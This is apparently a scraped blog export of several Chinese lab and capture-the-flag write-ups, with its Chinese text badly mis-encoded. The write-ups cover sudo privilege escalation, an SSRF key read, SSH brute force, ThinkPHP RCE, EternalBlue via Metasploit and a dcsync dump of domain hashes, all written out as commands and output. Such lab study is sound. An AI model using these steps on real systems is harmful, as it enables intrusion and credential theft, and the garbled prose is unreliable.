/etc/apache2/apache2.conf apache2.conf.bakæ–‡ä»¶æ˜¯æˆ‘ä»¬å¯æ§çš„ï¼Œåé¢ç»è¿‡ç¾¤ä¸»æé†’æˆ‘æ‰å¹¡ç„¶é†’æ‚Ÿï¼Œå¯ä»¥åšä¸€ä¸ªè½¯è¿æ¥å•Šï¼Œ/etc/apache2/apache2.confæˆ‘ä»¬æ˜¯å¯è¯»çš„ 123456www-data@Byxs20:/var/www/html/conf$ ln -sf /home/welcome/user.txt apache2.conf.bakwww-data@Byxs20:/var/www/html/conf$ cat /etc/apache2/apache2.confflag&#123;user-05659dca555d4ddbc396b319645f3d2a&#125;www-data@Byxs20:/var/www/html/conf$ ln -sf /root/root.txt apache2.conf.bakwww-data@Byxs20:/var/www/html/conf$ cat /etc/apache2/apache2.confflag&#123;root-f9ef88715e3bbec612f9f88d64ae3a99&#125; å¦ä¸€ä¸ªæ€è·¯å°±æ˜¯ä¿®æ”¹apache2.conf.bakï¼Œå°†webæœåŠ¡ä»¥welcomeçš„æƒé™è¿è¡Œï¼Œå°†apacke2.conf.baké‡Œé¢çš„Userå’ŒGroupä¿®æ”¹ä¸€ä¸‹ 12User welcomeGroup welcome ç„¶åä¸Šä¼ å†é‡å¯é¶æœºï¼Œç„¶åå†æ¬¡åå¼¹shellä¼šå‘ç°ç”¨æˆ·å˜æˆwelcomeäº†ï¼ˆè¿™é‡Œä¸èƒ½ä¿®æ”¹æˆrootï¼Œæ˜¯å› ä¸ºapache2é»˜è®¤ä¸å…è®¸rootå¯åŠ¨ï¼Œå¦‚æœè¦rootå¯åŠ¨ï¼Œéœ€è¦æ·»åŠ â€œ-DBIG_SECURITY_HOLEâ€åˆ°CFLAGSç¯å¢ƒå˜é‡ä¸­é‡æ–°ç¼–è¯‘ï¼‰ 12iduid=1000(welcome) gid=1000(welcome) groups=1000(welcome) æŸ¥çœ‹sudo -l 123456789welcome@Byxs20:/home/welcome$ sudo -lsudo -lMatching Defaults entries for welcome on Byxs20: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/binUser welcome may run the following commands on Byxs20: (ALL : ALL) NOPASSWD: /usr/sbin/reboot (ALL : ALL) NOPASSWD: /home/welcome/test/test å°±æ˜¯ç‹ç‚¸æ–¹æ¡ˆï¼Œå°†testç›®å½•æ¢ä¸€ä¸ªåå†æ–°åˆ›å»ºä¸€ä¸ªtest/test 1234567891011welcome@Byxs20:/home/welcome$ mv test 1mv test 1welcome@Byxs20:/home/welcome$ mkdir testmkdir testwelcome@Byxs20:/home/welcome$ echo &#x27;bash -p&#x27;&gt;test/testecho &#x27;bash -p&#x27;&gt;test/testwelcome@Byxs20:/home/welcome$ chmod +x test/testchmod +x test/testwelcome@Byxs20:/home/welcome$ sudo /home/welcome/test/testsudo /home/welcome/test/testroot@Byxs20:/home/welcome#","categories":[{"name":"660930334","slug":"660930334","permalink":"https://lvzhouhang.xyz/categories/660930334/"}],"tags":[{"name":"é¶æœº","slug":"é¶æœº","permalink":"https://lvzhouhang.xyz/tags/%E9%9D%B6%E6%9C%BA/"}]},{"title":"ç¾¤å‹æœº-Anjy","slug":"ç¾¤å‹é¶æœº-Anjy","date":"2025-04-19T08:23:50.000Z","updated":"2025-04-30T09:48:01.895Z","comments":true,"path":"2025/04/19/ç¾¤å‹é¶æœº-Anjy/","permalink":"https://lvzhouhang.xyz/2025/04/19/%E7%BE%A4%E5%8F%8B%E9%9D%B6%E6%9C%BA-Anjy/","excerpt":"","text":"ä¿¡æ¯æœé›†arp-scan -læ‰«æé¶æœºåœ°å€ 123456789â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]â””â”€# arp-scan -lInterface: eth0, type: EN10MB, MAC: 00:0c:29:ff:66:80, IPv4: 192.168.31.129Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)192.168.31.1 0a:00:27:00:00:11 (Unknown: locally administered)192.168.31.2 08:00:27:da:a9:b6 PCS Systemtechnik GmbH192.168.31.147 08:00:27:e8:2b:5e PCS Systemtechnik GmbH3 packets received by filter, 0 packets dropped by kernel 192.168.31.147å°±æ˜¯é¶æœºipï¼Œç„¶ånmapæ‰«æç«¯å£ 123456789101112â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]â””â”€# nmap 192.168.31.147Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-19 04:25 EDTNmap scan report for 192.168.31.147Host is up (0.0014s latency).Not shown: 998 closed tcp ports (reset)PORT STATE SERVICE22/tcp open ssh80/tcp open httpMAC Address: 08:00:27:E8:2B:5E (PCS Systemtechnik/Oracle VirtualBox virtual NIC)Nmap done: 1 IP address (1 host up) scanned in 6.88 seconds 80ç«¯å£80ç«¯å£æ˜¯ä¸€ä¸ªwebé¡µé¢å­˜åœ¨ssrfæ¼æ´ï¼ŒPOSTä¼ å‚url=file:///etc/passwdï¼Œæ–‡ä»¶å†…å®¹ä¼šè¿›è¡Œbase64åŠ å¯† å¯ä»¥è¯»å–åˆ°welcomeè¿™ä¸ªç”¨æˆ·ï¼Œhomeç›®å½•ä¸‹ä¸å­˜åœ¨id_rsa,è¯»å–/etc/ssh/sshd_config 123#HostKey /etc/ssh/ssh_host_rsa_key#HostKey /etc/ssh/ssh_host_ecdsa_key#HostKey /etc/ssh/ssh_host_ed25519_key ç„¶åæŒ¨ä¸ªè¯•è¯•id_rsa,id_ecdsa,id_ed25519,å¯ä»¥å‘ç°å­˜åœ¨id_ed25519 1url=file:///home/welcome/.ssh/id_ed25519 æ‹¿åˆ°ç§é’¥äº†å°±å¯ä»¥sshç™»å½•äº† ææƒ123456789101112â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]â””â”€# ssh welcome@192.168.31.147 -i idLinux Anjv 4.19.0-27-amd64 #1 SMP Debian 4.19.316-1 (2024-06-25) x86_64The programs included with the Debian GNU/Linux system are free software;the exact distribution terms for each program are described in theindividual files in /usr/share/doc/*/copyright.Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extentpermitted by applicable law.Last login: Sat Apr 19 04:31:17 2025 from 192.168.31.129welcome@Anjv:~$ sudo -lå¯ä»¥å‘ç°elinkså¯ä»¥ä»¥rootç”¨æˆ·æ‰§è¡Œï¼Œå¯ä»¥ç›´æ¥è¯»å–root.txtï¼Œä¹Ÿå¯ä»¥ä»»æ„æ–‡ä»¶è¯»å†™ï¼Œæœ€ç®€å•çš„æ˜¯å†elinksç»ˆç«¯æŒ‰ä¸‹esc-&gt;file-&gt;OS SHELL å°±å¯ä»¥è·å–åˆ°rootçš„shelläº†","categories":[{"name":"660930334","slug":"660930334","permalink":"https://lvzhouhang.xyz/categories/660930334/"}],"tags":[{"name":"é¶æœº","slug":"é¶æœº","permalink":"https://lvzhouhang.xyz/tags/%E9%9D%B6%E6%9C%BA/"}]},{"title":"HackmyVM-find","slug":"HackmyVM-find","date":"2025-04-19T03:22:30.000Z","updated":"2025-04-19T13:25:36.810Z","comments":true,"path":"2025/04/19/HackmyVM-find/","permalink":"https://lvzhouhang.xyz/2025/04/19/HackmyVM-find/","excerpt":"","text":"ä¿¡æ¯æœé›†arp-scan -l 1234567â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]â””â”€# arp-scan -lInterface: eth0, type: EN10MB, MAC: 00:0c:29:ff:66:80, IPv4: 192.168.31.129Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)192.168.31.1 0a:00:27:00:00:11 (Unknown: locally administered)192.168.31.2 08:00:27:dd:48:d1 PCS Systemtechnik GmbH192.168.31.145 08:00:27:19:2f:ed PCS Systemtechnik GmbH 192.168.31.145æ˜¯é¶æœºipï¼Œæ‰«æä¸€ä¸‹ç«¯å£ 123456789101112â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]â””â”€# nmap 192.168.31.145Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-18 23:23 EDTNmap scan report for 192.168.31.145Host is up (0.0022s latency).Not shown: 998 closed tcp ports (reset)PORT STATE SERVICE22/tcp open ssh80/tcp open httpMAC Address: 08:00:27:19:2F:ED (PCS Systemtechnik/Oracle VirtualBox virtual NIC)Nmap done: 1 IP address (1 host up) scanned in 6.86 seconds æ‰«æç›®å½• 12345678910111213141516171819202122â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]â””â”€# gobuster dir -u &quot;http://192.168.31.145/&quot; -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x .php,.txt,.jpg===============================================================Gobuster v3.6by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)===============================================================[+] Url: http://192.168.31.145/[+] Method: GET[+] Threads: 10[+] Wordlist: /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt[+] Negative Status codes: 404[+] User Agent: gobuster/3.6[+] Extensions: txt,php[+] Timeout: 10s===============================================================Starting gobuster in directory enumeration mode===============================================================/cat.jpg (Status: 200) [Size: 35137]/manual (Status: 301) [Size: 317] [--&gt; http://192.168.31.145/manual/]/robots.txt (Status: 200) [Size: 13]/server-status (Status: 403) [Size: 279] user.txtrobots.txtæ˜¯è®©ä½ æ‰¾åˆ°user,æŠŠcat.jpgä¸‹è½½ä¸‹æ¥ 123456â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]â””â”€# strings cat.jpg...&gt;C&lt;;_&quot;!~&#125;|&#123;zyxwvutsrqponmlkjihgfedcba`_^]\\[ZYXWVUTSRQPONMLKJ`_dcba`_^]\\Uy&lt;XWVOsrRKPONGk.-,+*)(&#x27;&amp;%$#&quot;!~&#125;|&#123;zyxwvutsrqponmlkjihgfedcba`_^]\\[ZYXWVUTSRQPONMLKJIHGFEDZY^W\\[ZYXWPOsSRQPON0Fj-IHAeR æœ€åä¸€ä¸²å­—ç¬¦ä¸²æ˜¯Malbolgeè¯­è¨€ï¼Œè·‘ä¸€ä¸‹å¾—åˆ°missyredï¼Œç„¶åhydraçˆ†ç ´å¯†ç  123456789â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]â””â”€# hydra -l missyred -P /usr/share/wordlists/rockyou.txt 192.168.31.145 sshHydra v9.5 (c) 2023 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-04-18 23:30:36[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task[DATA] attacking ssh://192.168.31.145:22/[22][ssh] host: 192.168.31.145 login: missyred password: iloveyou sshç™»å½•,sudo -l 1234567missyred@find:~$ sudo -l[sudo] password for missyred:Matching Defaults entries for missyred on find: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/binUser missyred may run the following commands on find: (kings) /usr/bin/perl perlææƒåˆ°kings 1missyred@find:~$ sudo -u kings perl -e &#x27;exec &quot;/bin/sh&quot;;&#x27; root.txt123456kings@find:~$ sudo -lMatching Defaults entries for kings on find: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/binUser kings may run the following commands on find: (ALL) NOPASSWD: /opt/boom/boom.sh /opt/boom/boom.shæ˜¯ä¸å­˜åœ¨çš„ï¼Œæˆ‘ä»¬å¯ä»¥è‡ªå·±åˆ›å»ºï¼Œéšä¾¿æ‰§è¡Œshå‘½ä»¤ 12#boom.shbash -p sudo /opt/boom/boom.sh ææƒåˆ°root.txt","categories":[{"name":"HackMyVM","slug":"HackMyVM","permalink":"https://lvzhouhang.xyz/categories/HackMyVM/"}],"tags":[{"name":"é¶æœº","slug":"é¶æœº","permalink":"https://lvzhouhang.xyz/tags/%E9%9D%B6%E6%9C%BA/"}]},{"title":"HackmyVM-hotel","slug":"HackmyVM-hotel","date":"2025-04-19T02:56:13.000Z","updated":"2025-04-19T13:25:36.810Z","comments":true,"path":"2025/04/19/HackmyVM-hotel/","permalink":"https://lvzhouhang.xyz/2025/04/19/HackmyVM-hotel/","excerpt":"","text":"ä¿¡æ¯æœé›†arp-scan -l 1234567â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]â””â”€# arp-scan -lInterface: eth0, type: EN10MB, MAC: 00:0c:29:ff:66:80, IPv4: 192.168.31.129Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)192.168.31.1 0a:00:27:00:00:11 (Unknown: locally administered)192.168.31.2 08:00:27:f8:3e:94 PCS Systemtechnik GmbH192.168.31.144 08:00:27:5c:e1:4f PCS Systemtechnik GmbH 192.168.31.144å°±æ˜¯é¶æœºipï¼Œæ‰«æç«¯å£ 123PORT STATE SERVICE REASON22/tcp open ssh syn-ack ttl 6480/tcp open http syn-ack ttl 64 å¼€å¯äº†22å’Œ80ç«¯å£ user.txt80ç«¯å£æ˜¯ä¸€ä¸ªhoteldruidï¼Œå­˜åœ¨ndayhttps://github.com/kaal18/CVE-2022-22909# åå¼¹ä¸€ä¸ªshellå‡ºæ¥ï¼Œ/var/www/htmlç›®å½•ä¸‹æœ‰ä¸€ä¸ªttylogå¾ˆå¯ç–‘ï¼Œç”¨ttyplayå¯ä»¥é‡ç°å½“æ—¶å½•åˆ¶çš„tty å¾—åˆ°personçš„å¯†ç ä¸º 1Endur4nc3. sshç™»å½•ï¼Œæ‹¿åˆ°user.txt root.txtsudo -l 123456person@hotel:~$ sudo -lMatching Defaults entries for person on hotel: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/binUser person may run the following commands on hotel: (root) NOPASSWD: /usr/bin/wkhtmltopdf sudo /usr/bin/wkhtmltopdf file:///root/root.txt 1.pdfå¯ä»¥æ‹¿åˆ°root.txt","categories":[{"name":"HackMyVM","slug":"HackMyVM","permalink":"https://lvzhouhang.xyz/categories/HackMyVM/"}],"tags":[{"name":"é¶æœº","slug":"é¶æœº","permalink":"https://lvzhouhang.xyz/tags/%E9%9D%B6%E6%9C%BA/"}]},{"title":"æ˜¥ç§‹äº‘é•œ-Initial","slug":"æ˜¥ç§‹äº‘é•œ-Initial","date":"2025-04-18T12:00:10.000Z","updated":"2025-04-19T13:28:02.245Z","comments":true,"path":"2025/04/18/æ˜¥ç§‹äº‘é•œ-Initial/","permalink":"https://lvzhouhang.xyz/2025/04/18/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Initial/","excerpt":"","text":"FLAG1é¦–å…ˆè¿›è¡Œä¿¡æ¯æœé›† 123456789101112131415161718192021222324252627282930â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]â””â”€# ../pentest/fscan/fscan2 -h 39.99.232.66â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”â”‚ ___ _ â”‚â”‚ / _ \\ ___ ___ _ __ __ _ ___| | __ â”‚â”‚ / /_\\/____/ __|/ __| &#x27;__/ _` |/ __| |/ / â”‚â”‚ / /_\\\\_____\\__ \\ (__| | | (_| | (__| &lt; â”‚â”‚ \\____/ |___/\\___|_| \\__,_|\\___|_|\\_\\ â”‚â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ Fscan Version: 2.0.0[2025-04-18 08:00:46] [INFO] æš´åŠ›ç ´è§£çº¿ç¨‹æ•°: 1[2025-04-18 08:00:46] [INFO] å¼€å§‹ä¿¡æ¯æ‰«æ[2025-04-18 08:00:46] [INFO] æœ€ç»ˆæœ‰æ•ˆä¸»æœºæ•°é‡: 1[2025-04-18 08:00:46] [INFO] å¼€å§‹ä¸»æœºæ‰«æ[2025-04-18 08:00:46] [INFO] æœ‰æ•ˆç«¯å£æ•°é‡: 233[2025-04-18 08:00:46] [SUCCESS] ç«¯å£å¼€æ”¾ 39.99.232.66:22[2025-04-18 08:00:46] [SUCCESS] ç«¯å£å¼€æ”¾ 39.99.232.66:80[2025-04-18 08:00:46] [SUCCESS] æœåŠ¡è¯†åˆ« 39.99.232.66:22 =&gt; [ssh] ç‰ˆæœ¬:8.2p1 Ubuntu 4ubuntu0.5 äº§å“:OpenSSH ç³»ç»Ÿ:Linux ä¿¡æ¯:Ubuntu Linux; protocol 2.0 Banner:[SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.5.][2025-04-18 08:00:51] [SUCCESS] æœåŠ¡è¯†åˆ« 39.99.232.66:80 =&gt; [http][2025-04-18 08:00:55] [INFO] å­˜æ´»ç«¯å£æ•°é‡: 2[2025-04-18 08:00:55] [INFO] å¼€å§‹æ¼æ´æ‰«æ[2025-04-18 08:00:55] [INFO] åŠ è½½çš„æ’ä»¶: ssh, webpoc, webtitle[2025-04-18 08:00:55] [SUCCESS] ç½‘ç«™æ ‡é¢˜ http://39.99.232.66 çŠ¶æ€ç :200 é•¿åº¦:5578 æ ‡é¢˜:Bootstrap Material Admin[2025-04-18 08:00:57] [SUCCESS] ç›®æ ‡: http://39.99.232.66:80 æ¼æ´ç±»å‹: poc-yaml-thinkphp5023-method-rce æ¼æ´åç§°: poc1 è¯¦ç»†ä¿¡æ¯: links:https://github.com/vulhub/vulhub/tree/master/thinkphp/5.0.23-rce[2025-04-18 08:01:01] [SUCCESS] æ‰«æå·²å®Œæˆ: 3/3 80ç«¯å£å­˜åœ¨thinkphpçš„æ¼æ´ï¼Œç›´æ¥å·¥å…·ä¸€æŠŠæ¢­äº†ï¼Œæ‹¿åˆ°shellåæä¸€ä¸‹æƒ,sudoå¯ä»¥æ— å¯†ç æ‰§è¡Œmysqlï¼Œmysqlææƒ 12345(www-data:/) $ sudo -lMatching Defaults entries for www-data on ubuntu-web01: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/binUser www-data may run the following commands on ubuntu-web01: (root) NOPASSWD: /usr/bin/mysql 1sudo mysql -e &#x27;\\! cat /root/flag/flag01.txt&#x27; æ‹¿åˆ°äº†flagçš„ç¬¬ä¸€éƒ¨åˆ† FLAG2&amp;&amp;FLAG3å†™ä¸€ä¸ªå…¬é’¥è¿›å»ï¼Œç„¶åsshç™»å½•ï¼Œä¸Šä¼ fscanå†åšä¸€ä¸ªä»£ç† 12345678910111213(www-data:/tmp) $ ip a1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000 link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00 inet 127.0.0.1/8 scope host lo valid_lft forever preferred_lft forever inet6 ::1/128 scope host valid_lft forever preferred_lft forever2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc mq state UP group default qlen 1000 link/ether 00:16:3e:25:0c:72 brd ff:ff:ff:ff:ff:ff inet 172.22.1.15/16 brd 172.22.255.255 scope global dynamic eth0 valid_lft 315359017sec preferred_lft 315359017sec inet6 fe80::216:3eff:fe25:c72/64 scope link valid_lft forever preferred_lft forever 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788root@ubuntu-web01:~# ./fscan -h 172.22.1.15/24â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”â”‚ ___ _ â”‚â”‚ / _ \\ ___ ___ _ __ __ _ ___| | __ â”‚â”‚ / /_\\/____/ __|/ __| &#x27;__/ _` |/ __| |/ / â”‚â”‚ / /_\\\\_____\\__ \\ (__| | | (_| | (__| &lt; â”‚â”‚ \\____/ |___/\\___|_| \\__,_|\\___|_|\\_\\ â”‚â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ Fscan Version: 2.0.0[2025-04-18 20:14:45] [INFO] æš´åŠ›ç ´è§£çº¿ç¨‹æ•°: 1[2025-04-18 20:14:45] [INFO] å¼€å§‹ä¿¡æ¯æ‰«æ[2025-04-18 20:14:45] [INFO] CIDRèŒƒå›´: 172.22.1.0-172.22.1.255[2025-04-18 20:14:45] [INFO] ç”ŸæˆIPèŒƒå›´: 172.22.1.0.%!d(string=172.22.1.255) - %!s(MISSING).%!d(MISSING)[2025-04-18 20:14:45] [INFO] è§£æCIDR 172.22.1.15/24 -&gt; IPèŒƒå›´ 172.22.1.0-172.22.1.255[2025-04-18 20:14:45] [INFO] æœ€ç»ˆæœ‰æ•ˆä¸»æœºæ•°é‡: 256[2025-04-18 20:14:45] [INFO] å¼€å§‹ä¸»æœºæ‰«æ[2025-04-18 20:14:45] [SUCCESS] ç›®æ ‡ 172.22.1.15 å­˜æ´» (ICMP)[2025-04-18 20:14:45] [SUCCESS] ç›®æ ‡ 172.22.1.21 å­˜æ´» (ICMP)[2025-04-18 20:14:45] [SUCCESS] ç›®æ ‡ 172.22.1.2 å­˜æ´» (ICMP)[2025-04-18 20:14:45] [SUCCESS] ç›®æ ‡ 172.22.1.18 å­˜æ´» (ICMP)[2025-04-18 20:14:48] [INFO] å­˜æ´»ä¸»æœºæ•°é‡: 4[2025-04-18 20:14:48] [INFO] æœ‰æ•ˆç«¯å£æ•°é‡: 233[2025-04-18 20:14:48] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.1.2:88[2025-04-18 20:14:48] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.1.18:80[2025-04-18 20:14:48] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.1.15:80[2025-04-18 20:14:48] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.1.15:22[2025-04-18 20:14:48] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.1.18:445[2025-04-18 20:14:48] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.1.2:445[2025-04-18 20:14:48] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.1.21:445[2025-04-18 20:14:48] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.1.2:389[2025-04-18 20:14:48] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.1.2:139[2025-04-18 20:14:48] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.1.18:139[2025-04-18 20:14:48] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.1.21:139[2025-04-18 20:14:48] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.1.18:135[2025-04-18 20:14:48] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.1.2:135[2025-04-18 20:14:48] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.1.21:135[2025-04-18 20:14:48] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.1.18:3306[2025-04-18 20:14:49] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.1.15:22 =&gt; [ssh] ç‰ˆæœ¬:8.2p1 Ubuntu 4ubuntu0.5 äº§å“:OpenSSH ç³»ç»Ÿ:Linux ä¿¡æ¯:Ubuntu Linux; protocol 2.0 Banner:[SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.5.][2025-04-18 20:14:53] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.1.18:3306 =&gt; [mysql] äº§å“:MySQL ä¿¡æ¯:unauthorized Banner:[D.j Host &#x27;172.22.1.15&#x27; is not allowed to connect to this MySQL server][2025-04-18 20:14:53] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.1.2:88 =&gt;[2025-04-18 20:14:54] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.1.18:445 =&gt;[2025-04-18 20:14:54] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.1.2:445 =&gt;[2025-04-18 20:14:54] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.1.21:445 =&gt;[2025-04-18 20:14:54] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.1.2:389 =&gt; [ldap] äº§å“:Microsoft Windows Active Directory LDAP ç³»ç»Ÿ:Windows ä¿¡æ¯:Domain: xiaorang.lab, Site: Default-First-Site-Name[2025-04-18 20:14:54] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.1.2:139 =&gt; Banner:[.][2025-04-18 20:14:54] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.1.18:139 =&gt; Banner:[.][2025-04-18 20:14:54] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.1.21:139 =&gt; Banner:[.][2025-04-18 20:14:54] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.1.18:80 =&gt; [http][2025-04-18 20:14:54] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.1.15:80 =&gt; [http][2025-04-18 20:15:54] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.1.18:135 =&gt;[2025-04-18 20:15:54] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.1.2:135 =&gt;[2025-04-18 20:15:54] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.1.21:135 =&gt;[2025-04-18 20:15:54] [INFO] å­˜æ´»ç«¯å£æ•°é‡: 15[2025-04-18 20:15:54] [INFO] å¼€å§‹æ¼æ´æ‰«æ[2025-04-18 20:15:54] [INFO] åŠ è½½çš„æ’ä»¶: findnet, ldap, ms17010, mysql, netbios, smb, smb2, smbghost, ssh, webpoc, webtitle[2025-04-18 20:15:54] [SUCCESS] NetInfo æ‰«æç»“æœç›®æ ‡ä¸»æœº: 172.22.1.21ä¸»æœºå: XIAORANG-WIN7å‘ç°çš„ç½‘ç»œæ¥å£: IPv4åœ°å€: â””â”€ 172.22.1.21[2025-04-18 20:15:54] [SUCCESS] NetInfo æ‰«æç»“æœç›®æ ‡ä¸»æœº: 172.22.1.2ä¸»æœºå: DC01å‘ç°çš„ç½‘ç»œæ¥å£: IPv4åœ°å€: â””â”€ 172.22.1.2[2025-04-18 20:15:54] [SUCCESS] NetInfo æ‰«æç»“æœç›®æ ‡ä¸»æœº: 172.22.1.18ä¸»æœºå: XIAORANG-OA01å‘ç°çš„ç½‘ç»œæ¥å£: IPv4åœ°å€: â””â”€ 172.22.1.18[2025-04-18 20:15:54] [SUCCESS] ç½‘ç«™æ ‡é¢˜ http://172.22.1.15 çŠ¶æ€ç :200 é•¿åº¦:5578 æ ‡é¢˜:Bootstrap Material Admin[2025-04-18 20:15:54] [INFO] ç³»ç»Ÿä¿¡æ¯ 172.22.1.2 [Windows Server 2016 Datacenter 14393][2025-04-18 20:15:54] [SUCCESS] NetBios 172.22.1.2 DC:DC01.xiaorang.lab Windows Server 2016 Datacenter 14393[2025-04-18 20:15:54] [SUCCESS] NetBios 172.22.1.21 XIAORANG-WIN7.xiaorang.lab Windows Server 2008 R2 Enterprise 7601 Service Pack 1[2025-04-18 20:15:54] [SUCCESS] å‘ç°æ¼æ´ 172.22.1.21 [Windows Server 2008 R2 Enterprise 7601 Service Pack 1] MS17-010[2025-04-18 20:15:54] [SUCCESS] ç½‘ç«™æ ‡é¢˜ http://172.22.1.18 çŠ¶æ€ç :302 é•¿åº¦:0 æ ‡é¢˜:æ— æ ‡é¢˜ é‡å®šå‘åœ°å€: http://172.22.1.18?m=login[2025-04-18 20:15:54] [SUCCESS] NetBios 172.22.1.18 XIAORANG-OA01.xiaorang.lab Windows Server 2012 R2 Datacenter 9600[2025-04-18 20:15:55] [SUCCESS] ç½‘ç«™æ ‡é¢˜ http://172.22.1.18?m=login çŠ¶æ€ç :200 é•¿åº¦:4012 æ ‡é¢˜:ä¿¡å‘¼ååŒåŠå…¬ç³»ç»Ÿ[2025-04-18 20:15:55] [SUCCESS] ç›®æ ‡: http://172.22.1.15:80 æ¼æ´ç±»å‹: poc-yaml-thinkphp5023-method-rce æ¼æ´åç§°: poc1 è¯¦ç»†ä¿¡æ¯: links:https://github.com/vulhub/vulhub/tree/master/thinkphp/5.0.23-rce 172.22.1.21 æœ‰æ°¸æ’ä¹‹è“ï¼Œä¸Šmsfæ¢­å“ˆ 12345proxychains4 msfconsoleuse exploit/windows/smb/ms17_010_eternalblueset payload windows/x64/meterpreter/bind_tcp_uuidset RHOSTS 172.22.1.21exploit æ”¶é›†ä¸€äº›åŸŸå†…å“ˆå¸Œ 1234567891011121314meterpreter &gt; load kiwimeterpreter &gt; kiwi_cmd lsadump::dcsync /domain:xiaorang.lab /all /csv[DC] &#x27;xiaorang.lab&#x27; will be the domain[DC] &#x27;DC01.xiaorang.lab&#x27; will be the DC server[DC] Exporting domain &#x27;xiaorang.lab&#x27;[rpc] Service : ldap[rpc] AuthnSvc : GSS_NEGOTIATE (9)502 krbtgt fb812eea13a18b7fcdb8e6d67ddc205b 5141106 Marcus e07510a4284b3c97c8e7dee970918c5c 5121107 Charles f6a9881cd5ae709abb4ac9ab87f24617 5121000 DC01$ 